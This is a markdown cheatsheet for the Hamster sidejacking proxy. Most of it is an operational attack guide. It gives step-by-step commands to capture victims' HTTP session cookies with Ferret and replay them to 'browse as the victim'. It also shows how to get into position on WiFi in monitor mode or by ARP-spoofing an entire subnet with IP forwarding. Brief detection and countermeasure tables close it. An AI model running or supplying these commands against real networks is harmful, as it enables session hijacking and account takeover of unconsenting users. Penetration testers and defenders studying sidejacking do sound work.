# Hamster-Sidejack Cheatsheet

## Quick Start

```bash
# Start Hamster proxy
hamster-sidejack

# Configure browser proxy
# HTTP Proxy: 127.0.0.1
# Port: 1234

# Browse to captured sites
# Hamster injects captured cookies automatically
```

## Command Reference

| Command | Description |
|---------|-------------|
| `hamster-sidejack` | Start proxy on default port (1234) |
| `hamster-sidejack -p 8888` | Start on custom port |
| `hamster-sidejack -q` | Quiet mode (no output) |
| `hamster-sidejack -h` | Print help |

## Attack Workflow

```bash
# Step 1: Capture cookies with Ferret
sudo ferret-sidejack -i wlan0

# Step 2: Start Hamster
hamster-sidejack

# Step 3: Configure browser proxy
# HTTP Proxy: 127.0.0.1, Port: 1234

# Step 4: Navigate to victim's sites
# Hamster replaces cookies automatically

# Step 5: Browse as the victim
```

## Browser Proxy Configuration

### Firefox
```
Settings → Network Settings → Manual Proxy Configuration
  HTTP Proxy: 127.0.0.1
  Port: 1234
```

### Chrome (launch flag)
```bash
google-chrome --proxy-server="http://127.0.0.1:1234"
```

### curl
```bash
curl -x http://127.0.0.1:1234 http://target-site.com
```

### System-wide (environment variable)
```bash
export http_proxy=http://127.0.0.1:1234
export https_proxy=http://127.0.0.1:1234
```

## Integration with Ferret

```bash
# Terminal 1: Capture cookies
sudo ferret-sidejack -i wlan0mon

# Terminal 2: Run Hamster
hamster-sidejack

# Hamster reads from Ferret's output
ls ~/hamster/cookies.txt
```

## What Hamster Does

| Action | Description |
|--------|-------------|
| Intercepts HTTP requests | Reads outgoing browser requests |
| Replaces cookies | Injects captured victim cookies |
| Forwards request | Sends modified request to server |
| Returns response | Victim's authenticated content returned |

## Cookie File Locations

```bash
# Default locations
ls ~/hamster/cookies.txt
ls /tmp/ferret*.log

# View captured cookies
cat ~/hamster/cookies.txt

# Clear captured cookies
rm ~/hamster/cookies.txt
```

## Limitations

| Limitation | Description |
|-----------|-------------|
| HTTP only | Cannot proxy HTTPS traffic |
| Requires Ferret | Needs captured cookies to function |
| No encryption | Cookie injection is visible in traffic |
| Browser config | Must manually configure proxy |

## Practical Patterns

### WiFi Session Hijacking

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Capture cookies
sudo ferret-sidejack -i wlan0mon &

# Start proxy
hamster-sidejack &

# Browse captured sessions
```

### Internal Network Sessions

```bash
# ARP spoof for positioning
sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1 &
sudo sysctl -w net.ipv4.ip_forward=1

# Capture
sudo ferret-sidejack -i eth0 &

# Proxy
hamster-sidejack &

# Browse internal HTTP apps
```

## Troubleshooting

```bash
# Port 1234 in use
ss -lntp | grep :1234
pkill hamster-sidejack

# Try different port
hamster-sidejack -p 8888

# Browser not using proxy
# Verify proxy settings
# For Chrome: must use --proxy-server flag

# Cookies not injected
ls ~/hamster/cookies.txt
cat ~/hamster/cookies.txt
# Ensure cookies match the target domain

# HTTPS sites not working
# Expected behavior — Hamster only handles HTTP
# Check if site uses HTTPS
curl -I http://target-site.com
```

## Detection Indicators

| Indicator | Description |
|-----------|-------------|
| Port 1234 traffic | Default Hamster proxy port |
| Modified cookies | Cookie headers differ from browser |
| Proxy requests | HTTP requests via localhost proxy |
| Ferret output | Cookie capture logs |

## Blue Team Countermeasures

| Countermeasure | Description |
|---------------|-------------|
| Enforce HTTPS | Use HSTS headers |
| Secure cookies | Set Secure, HttpOnly, SameSite flags |
| Network segmentation | Isolate sensitive traffic |
| 802.1X | Require network authentication |
| Disable HTTP | Block plaintext protocols |

## Related Tools

| Tool | Purpose |
|------|---------|
| `ferret-sidejack` | Cookie capture (companion) |
| `bettercap` | ARP spoofing + MITM |
| `wireshark` | Packet analysis |
| `dsniff` | Network credential sniffer |
| `responder` | LLMNR/NBT-NS poisoning |
